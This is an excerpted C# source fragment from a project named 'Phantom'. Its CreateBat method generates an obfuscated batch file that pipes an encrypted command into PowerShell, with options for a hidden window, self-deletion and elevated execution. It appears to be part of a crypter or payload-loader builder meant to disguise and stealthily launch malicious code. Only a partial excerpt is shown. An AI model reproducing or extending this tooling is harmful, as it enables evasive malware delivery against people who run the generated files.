...
namespace Phantom
{
    internal class FileGen
    {
        ...
        internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, PhantomMain.FileType fileType, string ContentLineID, Random rng)
        {
            ...
            var obfuscated3 = Obfuscator.GenCodeBat(@"echo " + command + $" | \"{powershellPath}\"{hiddenstr}", rng, RandomSetVarName, 3);
            output.AppendLine(obfuscated3.Item1 + Environment.NewLine + obfuscated3.Item2);
